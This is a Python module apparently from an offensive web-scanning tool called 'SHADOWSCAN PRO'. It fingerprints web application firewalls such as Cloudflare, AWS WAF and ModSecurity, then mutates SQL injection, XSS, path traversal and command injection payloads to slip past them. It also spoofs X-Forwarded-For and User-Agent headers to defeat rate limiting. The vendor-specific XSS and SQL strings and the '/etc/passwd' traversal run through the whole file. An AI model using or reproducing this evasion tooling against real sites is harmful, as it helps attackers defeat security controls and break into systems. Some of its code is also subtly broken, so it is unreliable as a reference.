"""
SHADOWSCAN PRO - WAF Bypass Module
Advanced WAF evasion techniques
Developed by ROHAIB TECHNICAL | +92 306 3844400
"""

import random
import re
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import quote, unquote
import base64


class WAFBypass:
    """Advanced WAF bypass techniques"""
    
    # WAF signatures
    WAF_SIGNATURES = {
        "Cloudflare": [
            ("cf-ray", 0.9),
            ("__cfduid", 0.9),
            ("cloudflare-nginx", 0.8),
        ],
        "AWS WAF": [
            ("x-amzn-RequestId", 0.9),
            ("awselb", 0.8),
        ],
        "Akamai": [
            ("akamai", 0.9),
            ("akamaighost", 0.8),
        ],
        "Imperva": [
            ("incapsula", 0.9),
            ("visid_incap", 0.9),
        ],
        "F5 BIG-IP": [
            ("f5", 0.9),
            ("bigipserver", 0.8),
        ],
        "ModSecurity": [
            ("mod_security", 0.9),
            ("modsecurity", 0.8),
        ],
        "Sucuri": [
            ("sucuri", 0.9),
            ("cloudproxy", 0.7),
        ],
        "Wordfence": [
            ("wordfence", 0.9),
        ],
    }
    
    # Bypass techniques per attack type
    BYPASS_TECHNIQUES = {
        "sql_injection": [
            # Encoding techniques
            ("URL Encoding", lambda p: quote(p)),
            ("Double URL Encoding", lambda p: quote(quote(p))),
            ("Hex Encoding", lambda p: ''.join(f'%{ord(c):02x}' for c in p)),
            ("Unicode Encoding", lambda p: p.replace("'", "%u0027").replace('"', '%u0022')),
            
            # Comment techniques
            ("Inline Comments", lambda p: p.replace(" ", "/**/")),
            ("MySQL Comments", lambda p: p.replace(" ", "/*!50000*/")),
            ("Nested Comments", lambda p: p.replace("UNION", "UN/**/ION")),
            
            # Case variation
            ("Case Variation", lambda p: ''.join(c.upper() if i%2 else c.lower() for i,c in enumerate(p))),
            ("Random Case", lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p)),
            
            # Keyword bypass
            ("MySQL Version Comment", lambda p: p.replace("UNION", "/*!50000UNION*/")),
            ("Whitespace Bypass", lambda p: p.replace(" ", "%0a").replace("=", "%3d")),
            ("Null Byte", lambda p: p + "%00"),
            
            # Alternative syntax
            ("Alternative OR", lambda p: p.replace("OR", "||")),
            ("Alternative AND", lambda p: p.replace("AND", "&&")),
            ("No Quotes", lambda p: p.replace("'", "").replace('"', "")),
        ],
        "xss": [
            ("HTML Entity", lambda p: p.replace("<", "&lt;").replace(">", "&gt;")),
            ("Hex Entity", lambda p: p.replace("<", "&#x3C;").replace(">", "&#x3E;")),
            ("Unicode", lambda p: p.replace("<", "\\u003c").replace(">", "\\u003e")),
            ("Mixed Case", lambda p: p.replace("script", "scRiPt")),
            ("Alternative Tags", lambda p: p.replace("script", "img src=x onerror=")),
            ("Data URI", lambda p: f"data:text/html;base64,{base64.b64encode(p.encode()).decode()}"),
            ("JSFuck", lambda p: self._jsfuck_encode(p)),
        ],
        "path_traversal": [
            ("Double Dot", lambda p: p.replace("../", "....//")),
            ("URL Encode", lambda p: quote(p)),
            ("Double Encode", lambda p: quote(quote(p))),
            ("Unicode", lambda p: p.replace("../", "..%c0%af")),
            ("Absolute Path", lambda p: p.replace("../", "/etc/passwd")),
            ("Windows Path", lambda p: p.replace("../", "..\\..\\")),
        ],
        "command_injection": [
            ("Alternative Pipe", lambda p: p.replace("|", "%0a")),
            ("Backticks", lambda p: p.replace("|", "`")),
            ("Dollar", lambda p: p.replace(";", "$(sleep 5)")),
            ("Newline", lambda p: p.replace(";", "%0a")),
            ("Windows CMD", lambda p: p.replace(";", "&")),
            ("PowerShell", lambda p: p.replace(";", "| powershell")),
        ],
    }
    
    # WAF-specific bypasses
    WAF_SPECIFIC = {
        "Cloudflare": {
            "sql_injection": [
                "/*!50000UNION*/ SELECT",
                "%55%4e%49%4f%4e %53%45%4c%45%43%54",
            ],
            "xss": [
                "<svg/onload=alert(1)>",
                "<details/open/ontoggle=alert(1)>",
            ],
        },
        "AWS WAF": {
            "sql_injection": [
                "UNION%0aSELECT",
                "UNION%23%0aSELECT",
            ],
            "xss": [
                "<img src=x onerror=alert(1)//",
                "<body onload=alert(1)>",
            ],
        },
        "ModSecurity": {
            "sql_injection": [
                "UNION ALL SELECT",
                "UNION DISTINCT SELECT",
            ],
            "xss": [
                "<scriPt>alert(1)</scriPt>",
                "<img src=1 onerror=alert(1)>",
            ],
        },
    }
    
    def __init__(self):
        self.detected_waf = None
        self.successful_bypasses = []
    
    def detect_waf(self, headers: Dict, html: str) -> Optional[str]:
        """Detect WAF from headers and HTML"""
        
        combined = f"{headers} {html}".lower()
        
        best_match = None
        best_confidence = 0
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            confidence = 0
            
            for signature, weight in signatures:
                if signature.lower() in combined:
                    confidence += weight
            
            if confidence > best_confidence:
                best_confidence = confidence
                best_match = waf_name
        
        if best_confidence > 0.5:
            self.detected_waf = best_match
            return best_match
        
        return None
    
    def generate_bypass_payloads(self, original_payload: str, 
                                 attack_type: str) -> List[Tuple[str, str]]:
        """Generate WAF bypass payloads"""
        
        bypass_payloads = []
        
        # Add original
        bypass_payloads.append(("Original", original_payload))
        
        # Apply generic techniques
        techniques = self.BYPASS_TECHNIQUES.get(attack_type, [])
        
        for name, technique in techniques[:10]:  # Limit techniques
            try:
                bypassed = technique(original_payload)
                bypass_payloads.append((name, bypassed))
            except:
                pass
        
        # Apply WAF-specific bypasses
        if self.detected_waf:
            waf_bypasses = self.WAF_SPECIFIC.get(self.detected_waf, {}).get(attack_type, [])
            
            for bypass in waf_bypasses:
                bypass_payloads.append((f"{self.detected_waf} Bypass", bypass))
        
        return bypass_payloads
    
    def mutate_payload(self, payload: str, attack_type: str, 
                       mutation_count: int = 5) -> List[str]:
        """Generate mutated payloads"""
        
        mutations = []
        
        techniques = self.BYPASS_TECHNIQUES.get(attack_type, [])
        
        for _ in range(mutation_count):
            mutated = payload
            
            # Apply 2-3 random techniques
            selected = random.sample(techniques, min(3, len(techniques)))
            
            for _, technique in selected:
                try:
                    mutated = technique(mutated)
                except:
                    pass
            
            if mutated != payload and mutated not in mutations:
                mutations.append(mutated)
        
        return mutations
    
    def obfuscate_sql(self, query: str) -> List[str]:
        """Advanced SQL obfuscation"""
        
        obfuscated = []
        
        # Character encoding tricks
        char_bypass = [
            query.replace("'", "CHAR(39)"),
            query.replace("=", "LIKE"),
            query.replace(" ", "/**/"),
            f"/*!50000{query}*/",
        ]
        
        obfuscated.extend(char_bypass)
        
        # Number manipulation
        if "1" in query:
            obfuscated.append(query.replace("1", "2-1"))
            obfuscated.append(query.replace("1", "0x31"))
        
        # String manipulation
        if "SELECT" in query.upper():
            obfuscated.append(query.replace("SELECT", "SeLeCt"))
            obfuscated.append(query.replace("SELECT", "/*!50000SELECT*/"))
        
        return obfuscated
    
    def obfuscate_xss(self, script: str) -> List[str]:
        """Advanced XSS obfuscation"""
        
        obfuscated = []
        
        # HTML entity encoding
        entity_map = {
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;',
        }
        
        entity_encoded = script
        for char, entity in entity_map.items():
            entity_encoded = entity_encoded.replace(char, entity)
        obfuscated.append(entity_encoded)
        
        # String.fromCharCode
        char_codes = ','.join(str(ord(c)) for c in script)
        obfuscated.append(f"eval(String.fromCharCode({char_codes}))")
        
        # Base64
        b64 = base64.b64encode(script.encode()).decode()
        obfuscated.append(f"eval(atob('{b64}'))")
        
        # JSFuck-like (simplified)
        obfuscated.append(self._jsfuck_encode(script))
        
        return obfuscated
    
    def _jsfuck_encode(self, text: str) -> str:
        """Simplified JSFuck encoding"""
        # Simplified - real JSFuck would be much more complex
        encoded = []
        
        for char in text:
            encoded.append(f"String.fromCharCode({ord(char)})")
        
        return '+'.join(encoded)
    
    def bypass_rate_limit(self) -> Dict:
        """Techniques to bypass rate limiting"""
        
        return {
            "techniques": [
                "Use multiple IP addresses (proxy rotation)",
                "Add random delays between requests",
                "Use different User-Agents",
                "Distribute requests across time",
                "Use different API endpoints",
                "Add random query parameters",
            ],
            "headers": {
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "User-Agent": self._get_random_ua()
            }
        }
    
    def _get_random_ua(self) -> str:
        """Get random user agent"""
        uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        ]
        return random.choice(uas)
    
    def get_bypass_stats(self) -> Dict:
        """Get bypass statistics"""
        
        return {
            "detected_waf": self.detected_waf,
            "successful_bypasses": self.successful_bypasses,
            "bypass_rate": len(self.successful_bypasses) / 10 if self.successful_bypasses else 0,
            "available_techniques": {
                attack_type: len(techniques)
                for attack_type, techniques in self.BYPASS_TECHNIQUES.items()
            }
        }